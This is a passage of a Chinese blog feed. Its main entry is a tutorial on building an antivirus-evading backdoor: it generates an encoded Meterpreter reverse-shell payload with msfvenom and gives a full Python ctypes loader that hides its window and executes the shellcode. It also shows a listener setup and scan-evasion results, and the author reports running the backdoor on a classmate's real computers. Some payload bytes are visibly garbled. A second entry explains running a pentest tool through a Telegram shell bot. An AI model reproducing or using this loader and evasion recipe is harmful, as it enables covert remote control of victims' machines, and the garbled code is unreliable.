关于我》)，群主就是我。大家可以看我一个名为荣耀的相册，里面记载了过去一年里我所获得的或大或小的荣耀。如果没兴趣当我没说。相册密码是：我的荣耀<img src="https://img-blog.csdnimg.cn/20191226172234830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;契机&quot;&gt;&lt;a href=&quot;#契机&quot; class=&quot;headerlink&quot; title=&quot;契机&quot;&gt;&lt;/a&gt;契机&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20191226164253999.p
      
    
    </summary>
    
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="2019" scheme="http://yoursite.com/tags/2019/"/>
    
  </entry>
  
  <entry>
    <title>Python加密shellcode免杀</title>
    <link href="http://yoursite.com/2019/12/24/Python%E5%8A%A0%E5%AF%86shellcode%E5%85%8D%E6%9D%80/"/>
    <id>http://yoursite.com/2019/12/24/Python%E5%8A%A0%E5%AF%86shellcode%E5%85%8D%E6%9D%80/</id>
    <published>2019-12-24T12:42:16.000Z</published>
    <updated>2019-12-24T12:46:47.553Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><h1 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h1><p><strong>环境准备：</strong></p><ul><li>Windows7 32 位系统<ul><li>Shellcode 使用 kali linux Metasploit 生成 shellcode</li></ul></li></ul><p><strong>Windows7 需要安装的软件：</strong></p><ul><li>Python2.7</li><li>pip install pyinstaller</li><li>pip install pywin32</li><li>VCForPython27.msi(微软官网可以下载)</li></ul><hr><h1 id="制作流程"><a href="#制作流程" class="headerlink" title="制作流程"></a>制作流程</h1><h2 id="1-查IP地址"><a href="#1-查IP地址" class="headerlink" title="1. 查IP地址"></a>1. 查IP地址</h2><p>查看自己的使用监听MSF的IP地址 10.1.5.10<br><img src="https://i.loli.net/2019/12/24/dkMiteNEBufa9HA.png" alt="10.png"></p><hr><h2 id="2-生成shellcode"><a href="#2-生成shellcode" class="headerlink" title="2. 生成shellcode"></a>2. 生成shellcode</h2><p>红色字体需要修改成自己的ip地址和需要监听的端口号。</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp_uuid LPORT=``x`` LHOST=``x.x.x.x`` -e   x86/shikata_ga_nai -i 11 -f py -o samny.py</code></pre><p>   <img src="https://s2.ax1x.com/2019/12/24/lP8vmd.png" alt="11"></p><hr><h2 id="3-替换shellcode"><a href="#3-替换shellcode" class="headerlink" title="3. 替换shellcode"></a>3. 替换shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   buf= <span class="string">b""</span>buf =  <span class="string">b""</span></span><br><span class="line">   buf += <span class="string">b"\xb8\x99\xfb\x4d\xa7\xd9\xea\xd9\x74\x24\xf4\x5f\x23"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\xa2\x83\xef\xfc\x31\x47\x0e\x03\xde\xf5\xaf"</span></span><br><span class="line">************省略内容，替换内容************</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xb8\x99\xfb\x4d\xa7\xd9\xea\xd9\x74\x24\xf4\x5f\x23"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\xa2\x83\xef\xfc\x31\x47\x0e\x03\xde\xf5\xaf"</span></span><br><span class="line">buf += <span class="string">b"\x52\x3b\xc4\xe9\xe9\x9f\x23\x53\xac\x06\x9c\x45\x85"</span></span><br><span class="line">buf += <span class="string">b"\x89\xea\x37\xbe\x6a\x2e\x33\xf0\x1e\xbb\x3f\x80\x13"</span></span><br><span class="line">buf += <span class="string">b"\x76\xeb\x89\x4d\x9a\x48\xf1\xb3\x91\xcb\x32\x45\x2e"</span></span><br><span class="line">buf += <span class="string">b"\x4b\xdc\x96\x67\x9f\xb6\x14\x0a\x31\x26\x1a\xb8\xbd"</span></span><br><span class="line">buf += <span class="string">b"\xc1\xf5\x5d\x20\xcf\x4c\x95\x41\x7f\x19\xd2\x76\x96"</span></span><br><span class="line">buf += <span class="string">b"\x98\x6c\x89\x5b\x10\xb4\xfd\xf5\x2f\x4c\x78\x2f\xa0"</span></span><br><span class="line">buf += <span class="string">b"\x94\x1a\xbe\x0c\xbb\x5b\xfc\xeb\x81\x29\x54\x6e\x0c"</span></span><br><span class="line">buf += <span class="string">b"\x16\x91\xca\xdd\x71\x58\x89\x2f\xf3\x08\x08\x9e\xb8"</span></span><br><span class="line">buf += <span class="string">b"\xe2\xf5\x27\xb6\xb9\x31\x3c\xa7\x94\x90\x8c\xc6\x9d"</span></span><br><span class="line">buf += <span class="string">b"\x57\xd1\x11\x70\xed\x65\xf1\x3a\xc4\x15\x43\xba\x03"</span></span><br><span class="line">buf += <span class="string">b"\x97\xae\x81\x06\x77\x3e\xb0\xd0\xae\x99\x63\x1e\x3d"</span></span><br><span class="line">buf += <span class="string">b"\x80\x33\xac\x8b\xbb\x56\xb5\xc1\x4d\x5d\xab\x20\x34"</span></span><br><span class="line">buf += <span class="string">b"\xcd\x6c\x70\x0d\x85\x7b\xc0\x5d\xcc\xf6\x2d\xc0\x2b"</span></span><br><span class="line">buf += <span class="string">b"\x34\xa4\xc0\x0b\x1d\xee\xd8\xa3\xcb\x6d\xbe\x43\x37"</span></span><br><span class="line">buf += <span class="string">b"\x1d\xb6\x21\xa3\x2da\x20\x216\x89\x51\x2f\x01\x11\x97"</span></span><br><span class="line">buf += <span class="string">b"\x09\xbb\x54\x12e\xe8\x13\xeb\x02\x12\x01\x0f\xc1\x4e"</span></span><br><span class="line">buf += <span class="string">b"\xf3\xe4\x4w22\x1a\xa2\x38\x11\xb23\x4c\x76\x47\x11\x4e"</span></span><br><span class="line">buf += <span class="string">b"\xc8\xc6\x8swd\xed\xbc\x08\x9c\x65\xf8\x38\xf7\x00\x34"</span></span><br><span class="line">buf += <span class="string">b"\x34\x4e\xef\ax83\xqdsaff\x97\x8c\xde\x0c\x0e\xa4\xa4\x01"</span></span><br><span class="line">buf += <span class="string">b"\xc5\xd3\x61\x79\x83\qwx07\xec\x81\x04\x49\x8e\x9e\x10"</span></span><br><span class="line">buf += <span class="string">b"\xe8\xce\x64\x49\xb9\xc8\xc1\xdf\x4d\x7b\x9e\x6d\x94"</span></span><br><span class="line">buf += <span class="string">b"\x12\x50\xfc\x49\x8c\x17\x8a\x57\x69\xab\x2d\x85\x98"</span></span><br><span class="line">buf += <span class="string">b"\x52\x37\x11\xc9\x9f\x60\xed\x17\x31\x16\x4b\xae\x0e"</span></span><br><span class="line">buf += <span class="string">b"\xd4\x23\xef\x71\xd3\xc8\x35\x4b\x4w3\x3e\x7c\x39\x7c"</span></span><br><span class="line">buf += <span class="string">b"\x68\x60\x5b\x23\xc8\xab\x45\xa5\xe7\xef\x39\xd7\xad"</span></span><br><span class="line">buf += <span class="string">b"\xa6\xe7\x36\x6e\xa7\xef\xba\x01\x2e\x76\xa3\x0a\x79"</span></span><br><span class="line">buf += <span class="string">b"\xc5\xb7\x3d\xfa\xd1\xf7\xc7\x40\x30\x50\x95\x30\xdb"</span></span><br><span class="line">buf += <span class="string">b"\x13\x09\x91\x2f\x76\x91\x61\x9b\xea\x20\x5a\x0d\x5b"</span></span><br><span class="line">buf += <span class="string">b"\xa6\x96\xba\xac\xaf\x28\x1e\x2c\x33\x99\x8f\x00\x1d"</span></span><br><span class="line">buf += <span class="string">b"\x79\xec\x8a\x9b\xaa\xc4\xe8\x23\x50\xe6\xa9\xc8\xeb"</span></span><br><span class="line">buf += <span class="string">b"\x2b\x48\xc0\xe4\xfc\x93\x66\x9a\x44\xd4\xe3\xf7\x72"</span></span><br><span class="line">buf += <span class="string">b"\xdd\x26\x45\xb1\xec\x7c\xaf\x65\xd6\xf8\x53\xd0\xa8"</span></span><br><span class="line">buf += <span class="string">b"\x16\x9e\x39\xc6\x6c\xc1\x66\xf7\x28\xc7\x11\x52\xc9"</span></span><br><span class="line">buf += <span class="string">b"\xb9\x2e\xce\xec\x6c\xae\xe7\x55\x72\x89\xc0\x12\x92"</span></span><br><span class="line">buf += <span class="string">b"\x9b\x33\x0a\x1e\xe6\xc0\x91\xb6\x68\xf6\x26\xa5\xaa"</span></span><br><span class="line">buf += <span class="string">b"\x5d\xca\xd4\x60\x1d\x70\xde\xd8\x13\xad\x9c\xea\xa3"</span></span><br><span class="line">buf += <span class="string">b"\xe4\xbb\xdb\x3c\x27\x27\x50\xf9\x07\xe3\xa8\x04\xb5"</span></span><br><span class="line">buf += <span class="string">b"\xe9\xff\xd5\x5a\x51\x69\x33\x99\x5b\x27\x85\xcd\x36"</span></span><br><span class="line">buf += <span class="string">b"\x35\x22\xa9\x4f\xc6\x0d\xed\xf3\x40\xaa\x7b\x8e\xdb"</span></span><br><span class="line">buf += <span class="string">b"\xd8\xc9\x2b\x19\x78\x5a\x91\x61\x63\xf0\xae\x05\xcd"</span></span><br><span class="line">buf += <span class="string">b"\x28\xeb\x35\x15\x12\x67\x04\xb1\x93\xe8\x34\xc1\xc5"</span></span><br><span class="line">buf += <span class="string">b"\x21\xbf\x47\xb4\x15\x22\xbe\xb0\x0f\x43\x9d\xc4\x11"</span></span><br><span class="line">buf += <span class="string">b"\xe8\x92\x97\xfb\x75\xc7\x23\x70\xf3\x86\xcf\x55\xc4"</span></span><br><span class="line">buf += <span class="string">b"\xc0\xa6\x1a\x10\xab\xe9\xc1\xee\xf9\x13\x9c\xa0\xf9"</span></span><br><span class="line">buf += <span class="string">b"\xea\x1c\xaa\xasd1c\xbe\x6b\xe2\x8c\x91\x30\xbf\x20\x05"</span></span><br><span class="line">buf += <span class="string">b"\x3a\x82\x0f\x43\xe4\x4c\qwx54\x23\x26\xe4\x97\xc8\x5a"</span></span><br><span class="line">buf += <span class="string">b"\xd8\x6d\x5a\x74\x20\x51\x1c\xb9\x42\x3a\x2d\x96\xdd"</span></span><br><span class="line">buf += <span class="string">b"\x23\x3f\x72\xd6\x31\xe8\x67\x9c\xc8\xe5\x0b\x5e\xd7"</span></span><br><span class="line">buf += <span class="string">b"\xbd\xdf\x97\x96\x01\x44\x19\x78\x16\xd1\x45\xe7\xcd"</span></span><br><span class="line">buf += <span class="string">b"\x18\x1c\xb6\x84\xa8\x06\x3e\xe1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = len(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</span><br><span class="line"></span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">666</span>==<span class="number">666</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line"></span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><hr><h2 id="4-制作后门程序"><a href="#4-制作后门程序" class="headerlink" title="4. 制作后门程序"></a>4. 制作后门程序</h2><p>图标可以自己选择替换<br><img src="https://i.loli.net/2019/12/24/EFxIsLBrAY8wbZT.png" alt="6.png"></p><hr><h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h2><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp_uuidset lhost 192.168.23.129set lport 8888set EnableStageEncoding trueset StageEncoder x86/fnstenv_mov</code></pre><p><img src="https://s2.ax1x.com/2019/12/24/lP8LlD.png" alt="14"></p><p>测试系统版本如下：</p><ul><li>Windows 7(32位和64位)</li><li>Windows server 8 </li><li>Windows 10 1903</li><li>真实环境也测试成功，利用同学的电脑Windows 7和Windows 10均能成功。<br><img src="https://i.loli.net/2019/12/24/rchmDGuCaPHJy7N.png" alt="3.png"><br><img src="https://i.loli.net/2019/12/24/V36rXeA9NZ2STFu.png" alt="2.png"></li></ul><hr><h1 id="在线查杀结果"><a href="#在线查杀结果" class="headerlink" title="在线查杀结果"></a>在线查杀结果</h1><p><img src="https://i.loli.net/2019/12/24/Kq68XIzrhZwfCQD.png" alt="7.png"><br><img src="https://i.loli.net/2019/12/24/D7iNk8WJlx6mvtE.png" alt="8.png"></p><p><img src="https://i.loli.net/2019/12/24/TMakXC9wnhOVLUP.png" alt="9.png"><br><img src="https://i.loli.net/2019/12/24/PboOgJTuZ3tUHkd.png" alt="4.png"><br><img src="https://i.loli.net/2019/12/24/ELV1JS4YD67NwtT.png" alt="5.png"></p><p><a href="http://r.virscan.org/language/zh-cn/report/5587ae4565ebc058d2b7846eeb12b27a" target="_blank" rel="noopener">http://r.virscan.org/language/zh-cn/report/5587ae4565ebc058d2b7846eeb12b27a</a></p><hr><h1 id="意料之外的坑"><a href="#意料之外的坑" class="headerlink" title="意料之外的坑"></a>意料之外的坑</h1><ol><li>环境不对，最后我特意去下载Windows 7（32位）镜像安装一个虚拟机才成功。本机缺少某种环境，但是始终找不到，最后无奈之举才得以如此。<br><img src="https://s2.ax1x.com/2019/12/24/lP8qSO.png" alt="12"></li><li>最新版的kali无法弹shell，这一步卡了我很久很久，最后我用<a href="https://blog.csdn.net/sun1318578251/article/details/90733372" target="_blank" rel="noopener">Pentestbox</a>里面的msf监听端口才得以成功。</li></ol><p><img src="https://s2.ax1x.com/2019/12/24/lP8XOH.png" alt="13"><br><img src="https://s2.ax1x.com/2019/12/24/lP8LlD.png" alt="14"></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/qq_41770175/article/details/98475696" target="_blank" rel="noopener">https://blog.csdn.net/qq_41770175/article/details/98475696</a><br><a href="https://secquan.org/Discuss/906" target="_blank" rel="noopener">https://secquan.org/Discuss/906</a><br><a href="https://www.cnblogs.com/backlion/p/6785870.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/6785870.html</a></p><hr><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本文中提到的shellcode仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id=&quot;前提准备&quot;&gt;&lt;a href=&quot;#前提准备&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="免杀" scheme="http://yoursite.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://yoursite.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Telegram机器人作为渗透测试框架</title>
    <link href="http://yoursite.com/2019/12/16/Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%BD%9C%E4%B8%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"/>
    <id>http://yoursite.com/2019/12/16/Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%BD%9C%E4%B8%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</id>
    <published>2019-12-16T08:55:24.000Z</published>
    <updated>2019-12-19T04:22:50.019Z</updated>
    
    <content type="html"><![CDATA[<p>@<a href="目录">toc</a></p><dl><dt>Author<br>: Sofiane Hamlaoui</dt><dd><a href="https://medium.com/@SofianeHamlaoui/use-telegram-bot-as-a-penetration-testing-framework-a309c41dbc40" target="_blank" rel="noopener">原文链接</a></dd></dl><dl><dt>Translator</dt><dd>清水Samny</dd></dl><h1 id="想法来源"><a href="#想法来源" class="headerlink" title="想法来源"></a>想法来源</h1><p> 当我查看了浏览器书签，然后我注意medium<a href="国外类似于简书的应用">^1</a>有一篇有关<a href="https://medium.com/@arbazhussain/telegram-bot-for-hacking-pentesting-b7856db28ef" target="_blank" rel="noopener"><strong>Telegram bot的Hacking＆Pentesting</strong></a><em>的文章</em>。 我看了这篇文章并在我的<a href="https://twitter.com/S0fianeHamlaoui/status/1205414073837457408" target="_blank" rel="noopener"><strong>Twitter帐户</strong></a>上分享了它，然后发现有些CyberSec（或Interested by）喜欢该机器人的想法。</p><p>我创建了一个<a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework" target="_blank" rel="noopener">Lockdoor</a>的渗透测试框架，那么为什么不使用我的工具进行相同的测试呢？</p><p>更新 : <a href="https://medium.com/@arbazhussain" target="_blank" rel="noopener">Arbaz Hussain</a> 的工具无法使用了。( 2019/12/15 )</p><p><code>Check it here</code>: <code>https://github.com/arbazkiraak/hackbot</code></p><hr><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>这个想法是使用<a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework" target="_blank" rel="noopener">Lockdoor Framework</a>，通过任何Telegram聊天或者信息来实现的。</p><p>基本上，它是一款从一个Telegram聊天中执行（指令）工具。当然，在做这些操作之前，您必须先配置和安装工具，然后配置机器人，最后使用它。</p><hr><h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><ol><li>配置和安装Lockdoor Frameword:</li></ol><p>首先，你查看这个Lockdoor框架安装指南。</p><p><a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework/wiki/Installation?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">SofianeHamlaoui /锁门框架<br>🔐Lockdoor框架：具有网络安全资源的渗透测试框架</a></p><ul><li>或者直接使用下面命令安装。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$: git clone https:&#x2F;&#x2F;github.com&#x2F;SofianeHamlaoui&#x2F;Lockdoor-Framework.git &amp;&amp; cd Lockdoor-Framework </span><br><span class="line">$: chmod +x .&#x2F;install.sh </span><br><span class="line">$: .&#x2F;install.sh</span><br></pre></td></tr></table></figure></li></ul><hr><ol start="2"><li>配置和安装Telegram机器人</li></ol><p>使用一款由<a href="https://github.com/botgram" target="_blank" rel="noopener">botgram</a>改进的<a href="https://github.com/botgram/shell-bot" target="_blank" rel="noopener">shell bot</a>。</p><ul><li><a href="https://github.com/SofianeHamlaoui/lockdoor-bot" target="_blank" rel="noopener">https://github.com/SofianeHamlaoui/lockdoor-bot</a></li></ul><p><img src="https://i.loli.net/2019/12/16/eA4rHTXLyQmSRFn.png" alt="1.png"></p><p>打开访问 <code>https://web.telegram.org/</code></p><p>开始一段会话和我们的机器人之父<a href="https://web.telegram.org/#/im?p=@BotFather" target="_blank" rel="noopener">botfather</a></p><hr><p><code>创建Telegram机器人</code></p><p><img src="https://i.loli.net/2019/12/16/5XrbMygAhdmwlnF.jpg" alt="2.jpeg"></p><ul><li>输入/newbot  新建一个机器人。</li><li>给机器人起一个名字。</li><li>给机器人创建一个用户名。</li><li>复制保存API</li></ul><hr><ul><li><p>配置并运行机器人服务器运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Requirements : </span><br><span class="line">- python</span><br><span class="line">- node-pty</span><br><span class="line">- Telegram </span><br><span class="line">- Happiness :D</span><br></pre></td></tr></table></figure></li><li><p>安装</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$: git clone https:&#x2F;&#x2F;github.com&#x2F;SofianeHamlaoui&#x2F;Lockdoor-bot &amp;&amp; cd Lockdoor-bot</span><br><span class="line">$: npm install</span><br></pre></td></tr></table></figure><ul><li>开启服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: node server</span><br></pre></td></tr></table></figure></li></ul><p>第一次运行时，会根据问题答案自动创建配置文件<code>config.json</code>。你也可以自己编辑配置，参考<code>config.example.json</code>。</p><p><img src="https://i.loli.net/2019/12/16/rXvlHafi6YG7IU4.jpg" alt="3.jpeg"></p><hr><ul><li><p>在创建Telegram机器人之后复制API token。</p></li><li><p>打开访问机器人给出的链接(<a href="https://t.me/X/X/X/X/X/X/X/X/X/)并发送一条消息确认你的Telegram账号是机器人的主人。" target="_blank" rel="noopener">https://t.me/X/X/X/X/X/X/X/X/X/)并发送一条消息确认你的Telegram账号是机器人的主人。</a></p></li><li><p>运行服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: node server</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/16/dvIektFP7U8bDQK.png" alt="4.png"></p><p><code>看到这个就代表着机器人运行成功！</code></p></li></ul><hr><ul><li>命令集：<br>下面列出很多命令方便你使用机器人，或者也可以查看<a href="https://github.com/SofianeHamlaoui/lockdoor-bot" target="_blank" rel="noopener">github的repo</a>。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">run - Execute command</span><br><span class="line">enter - Send input lines to command</span><br><span class="line">type - Type keys into command</span><br><span class="line">control - Type Control+Letter</span><br><span class="line">meta - Send the next typed key with Alt</span><br><span class="line">keypad - Toggle keypad for special keys</span><br><span class="line">redraw - Force the command to repaint</span><br><span class="line">end - Send EOF to command</span><br><span class="line">cancel - Interrupt command</span><br><span class="line">kill - Send signal to process</span><br><span class="line">status - View status and current settings</span><br><span class="line">cd - Change directory</span><br><span class="line">env - Manipulate the environment</span><br><span class="line">shell - Change shell used to run commands</span><br><span class="line">resize - Change the terminal size</span><br><span class="line">setsilent - Enable &#x2F; disable silent output</span><br><span class="line">setlinkpreviews - Enable &#x2F; disable link expansion</span><br><span class="line">setinteractive - Enable &#x2F; disable shell interactive flag</span><br><span class="line">help - Get help</span><br><span class="line">file - View and edit small text files</span><br><span class="line">upload - Upload and overwrite raw files</span><br><span class="line">r - Alias for &#x2F;run or &#x2F;enter</span><br></pre></td></tr></table></figure></li><li><em>导入命令*</em></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;run - to run a command</span><br><span class="line">&#x2F;enter - to Send input lines to command</span><br></pre></td></tr></table></figure><p>在配置并运行服务器之后，你可以使用Lockdoor Framework 在任何一个Telegram对话或者消息中。</p><h1 id="2个选择"><a href="#2个选择" class="headerlink" title="2个选择"></a>2个选择</h1><p>Lockdoor Framework需要root权限，你可以做：</p><ul><li>1&gt; root运行机器人服务器（不推荐）。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: sudo node server</span><br></pre></td></tr></table></figure></li><li>2&gt;在Telegram对话中用root权限运行。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: ( Telegram chat ) : &#x2F;run sudo lockdoor</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="NEXT"><a href="#NEXT" class="headerlink" title="NEXT"></a>NEXT</h1><p> 转到你的telegram机器人聊天输入/run   lockdoor (或者  /run sudo lockdoor 如果没有用root启动服务器 )。</p><p><img src="https://i.loli.net/2019/12/16/sFpMxOLbuciy2lR.jpg" alt="5.jpeg"><br><img src="https://i.loli.net/2019/12/16/3dwyiqb7Wok6QKL.jpg" alt="6.jpeg"></p><hr><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p><code>你可以查看Lockdoor Framework Github repo 获取更多有关资料。</code></p><ul><li><a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者Github </a></li><li><a href="https://twitter.com/S0fianeHamlaoui?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者推特</a></li><li><a href="https://sofianehamlaoui.me/?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者网站</a></li><li><a href="https://www.facebook.com/S0fianeHamlaoui?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者脸书</a></li><li><a href="https://samny520.github.io/" target="_blank" rel="noopener">译者博客</a></li><li><a 